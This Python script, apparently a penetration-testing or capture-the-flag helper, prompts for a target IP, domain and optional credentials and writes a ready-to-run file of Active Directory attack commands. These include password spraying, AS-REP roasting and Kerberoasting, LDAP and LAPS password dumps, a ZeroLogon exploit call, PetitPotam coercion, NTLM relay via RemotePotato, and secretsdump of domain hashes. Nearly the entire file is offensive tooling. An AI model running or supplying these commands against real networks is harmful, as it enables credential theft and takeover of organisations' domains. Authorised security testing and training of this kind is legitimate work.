#!/usr/bin/env python3
import sys

def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password):
    # ANSI escape codes for red color and reset
    RED = '\033[31m'
    RESET = '\033[0m'

    ascii_art = RED + r"""
           (  )   /\   _                 (
            \ |  (  \ ( \.(               )            _____
          \  \ \  `  `   ) \             (  ___                 (  )   /\   _
       (_`    \+   . x   ( .\            \/   \          )      \ |  (  \ ( \.(               )            _____
      - .-               \+  ;          (     )        (  (     \  \ \  `  `   ) \             (  ___
           WELCOME TO      )  )        _)   ) _         )  )      (_`    \+   . x   ( .\            \/   \
         THE AD SYNTAX   (__/          \____/          (_(_()   - .-               \+  ;          (     )
               FILLER,    /             /               /                        )  )        _)   ) _
           SAVING YOU    (             (               /    made with love by bandors (__/          \____/
              TIME SINCE  2024

    """ + RESET

    with open('output.txt', 'w') as f:
        f.write(ascii_art + '\n')

        has_creds = bool(user and password)

        # Zone transfer
        f.write("# Zone transfer\n")
        f.write(f"dig axfr {domain} @{target_ip}\n\n")

        # RID brute force
        if not has_creds:
            f.write("# Guest RID brute\n")
            f.write(f"netexec smb {domain} -u anonymous -p '' --rid-brute 10000 | tee rid.txt\n")
        else:
            f.write("# Authenticated RID brute\n")
            f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000 | tee rid.txt\n")


        # Extract usernames and groups from RID output with sed
        f.write("# Clean up usernames/groups from RID output\n")
        f.write(r"sed -n 's/.*\\\([^ ]*\) (SidTypeUser).*/\1/p' rid.txt | sort -u > users.txt" + "\n")
        f.write(r"sed -n 's/.*\\\([^ ]*\) (SidType\(Group\|Alias\)).*/\1/p' rid.txt | sort -u > groups.txt" + "\n\n")

        # Kerbrute user enumeration
        f.write("# Kerbrute user enumeration\n")
        f.write(f"kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}\n\n")

        # RPC Enumeration
        f.write("# RPC Enumeration\n")
        if has_creds:
            f.write(f"rpcclient -U \"{user}%{password}\" {target_ip}\n")
        else:
            f.write(f"rpcclient -U \"\" -N {target_ip}\n")
        f.write("cat dirty.txt | cut -b 7-999 | rev | cut -b 14-99 | rev > users.txt\n\n")

        # Pre-creds password spray with files
        if not has_creds:
            f.write("# Try your users list as a password list\n")
            f.write(f"netexec smb {domain} -u users.txt -p users.txt --continue-on-success\n\n")

            f.write("# Generate case-toggled password list from usernames\n")
            f.write("awk '{print toupper(substr($0,1,1)) substr($0,2); print tolower(substr($0,1,1)) substr($0,2)}' users.txt > toggled_passwords.txt\n")
            f.write(f"netexec smb {domain} -u users.txt -p toggled_passwords.txt --continue-on-success\n\n")

        #AS-REP search when creds are available
        if has_creds:
            f.write(f"# AS-REP search when creds are available\n")
            f.write(f"GetNPUsers.py -dc-ip {target_ip} -request {domain}/{user}:'{password}' | tee ASREP.out\n")

        # AS Rep Roasting backup
        f.write("# AS Rep Roasting raw users spray\n")
        f.write(f"for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n\n")

        # Kerberoasting
        f.write("# Kerberoasting\n")
        if not has_creds:
            f.write("# Kerberoasting as a guest\n")
            f.write(f"GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n\n")
        if has_creds:
            f.write("# Authenticated Kerberoasting\n")
            f.write(f"GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
        f.write("# Kerberoasting off of a user who was AS REP roastable but not crackable\n")
        f.write(f"GetUserSPNs.py -no-preauth '{user if user else 'guest'}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n\n")

        # LDAP enumeration
        f.write("# LDAP Enumeration\n")
        f.write("Run without any pipes first to see if any data shows up.\n")
        base_dn = ",".join(f"dc={part}" for part in domain.split("."))
        f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"{base_dn}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n\n")

        # Authenticated LDAP enumeration
        if has_creds:
            f.write("# Authenticated LDAP Enumeration\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\"\n\n")

            f.write("# LDAP - Dump all users with descriptions (password hints often hiding here)\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(objectClass=user)' sAMAccountName description | grep -E 'sAMAccountName|description' | paste - -\n\n")

            f.write("# LDAP - Find accounts with SPNs set (Kerberoastable)\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName\n\n")

            f.write("# LDAP - Find accounts that don't require Kerberos pre-auth (AS-REP roastable)\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName\n\n")

            f.write("# LDAP - Enumerate domain admins\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(memberOf=CN=Domain Admins,CN=Users,{base_dn})' sAMAccountName\n\n")

            f.write("# LDAP - Find disabled accounts\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(userAccountControl:1.2.840.113556.1.4.803:=2)' sAMAccountName\n\n")

            f.write("# LDAP - Find computers in the domain\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(objectClass=computer)' name operatingSystem\n\n")

            f.write("# LDAP - Check for LAPS (Local Admin Password Solution)\n")
            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd ms-Mcs-AdmPwdExpirationTime sAMAccountName\n\n")

        # ZeroLogon check
        f.write("# ZeroLogon Check\n")
        f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n\n")

        # Bloodhound CE Python
        if has_creds:
            f.write("# Bloodhound CE Python ingestor\n")
            f.write(f"bloodhound-ce-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")

        # Powerview.py enumeration
        if has_creds:
            f.write("# Powerview.py enumeration\n")
            f.write(f"getTGT.py {domain}/{user}:'{password}'\n")
            f.write(f"export KRB5CCNAME=./{user}.ccache\n")
            f.write(f"powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n\n")

        # Delegation enumeration
        if has_creds:
            f.write("# Delegation Enumeration (unconstrained, constrained, RBCD)\n")
            f.write(f"findDelegation.py {domain}/{user}:'{password}' -dc-ip {target_ip}\n\n")

        # GPP Passwords
        if has_creds:
            f.write("# GPP Passwords (Group Policy Preferences)\n")
            f.write(f"Get-GPPPassword.py {domain}/{user}:'{password}' -dc-ip {target_ip}\n\n")

        # Coercion checks
        if has_creds and local_ip:
            f.write("# Coercion Checks - PetitPotam\n")
            f.write(f"python3 PetitPotam.py {local_ip} {target_ip}\n")
            f.write(f"python3 PetitPotam.py -u {user} -p '{password}' -d {domain} {local_ip} {target_ip}\n\n")
            f.write("# Coercion Checks - PrinterBug / Dementor\n")
            f.write(f"python3 dementor.py {local_ip} {target_ip} -u {user} -p '{password}' -d {domain}\n\n")

        # Secretsdump
        if has_creds:
            f.write("# Secretsdump (requires admin creds)\n")
            f.write(f"secretsdump.py {domain}/{user}:'{password}'@{target_ip}\n")
            f.write(f"secretsdump.py {domain}/{user}:'{password}'@{target_ip} -just-dc-ntlm\n\n")

        # Password spraying after creds known
        if has_creds:
            f.write("# Password Spray with known password\n")
            f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n\n")

        # RemotePotato check
        if has_creds and local_ip:
            f.write("# RemotePotato Check\n")
            f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
            f.write(f"sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
            f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n\n")

        # SMB Enumeration
        if has_creds:
            f.write("# SMB Enumeration with credentials\n")
            f.write(f"smbmap -u '{user}' -p '{password}' -H {target_ip}\n")
            f.write(f"sudo smbclient //{target_ip}/example -U '{user}'%'{password}'\n\n")
        else:
            f.write("# SMB Enumeration\n")
            f.write(f"sudo smbclient -N -L //{target_ip}\n")
            f.write(f"smbmap -u '' -p '' -H {target_ip}\n")
            f.write("# Example Share Connection without credentials\n")
            f.write(f"sudo smbclient //{target_ip}/example -N\n\n")

        # WinRM Access
        if has_creds:
            f.write("# WinRM Access\n")
            f.write(f"sudo evil-winrm -i {target_ip} -u {user} -p '{password}'\n\n")

        # ADCS checking
        if has_creds:
            f.write("# Check for ADCS\n")
            f.write(f"netexec ldap {target_ip} -u {user} -p '{password}' -M adcs\n\n")
            f.write("# Check for bad templates\n")
            f.write(f"certipy find -ldap-scheme ldap -u {user}@{domain} -p '{password}' -target {hostname}.{domain} -dc-ip {target_ip} -vulnerable -stdout\n\n")

        # Try MSSQL
        if has_creds:
            f.write("# MSSQL connection - try with and without -windows-auth\n")
            f.write(f"mssqlclient.py {domain}/{user}:'{password}'@{target_ip} -windows-auth\n")
            f.write(f"mssqlclient.py {domain}/{user}:'{password}'@{target_ip}\n\n")

            f.write("# MSSQL enum via netexec\n")
            f.write(f"netexec mssql {target_ip} -u {user} -p '{password}' -q 'SELECT name FROM master.dbo.sysdatabases;'\n")
            f.write(f"netexec mssql {target_ip} -u {user} -p '{password}' -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'');'\n\n")

    print("output.txt file generated successfully.")

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ").strip()
    hostname = input("Enter Hostname: ").strip()
    domain = input("Enter Domain: ").strip()

    user = input("Enter User (leave blank if none): ").strip()
    password = input("Enter Password (leave blank if none): ").strip()

    has_creds = bool(user and password)
    local_ip = ""

    if has_creds:
        local_ip = input("Enter Local IP: ").strip()

    create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password)
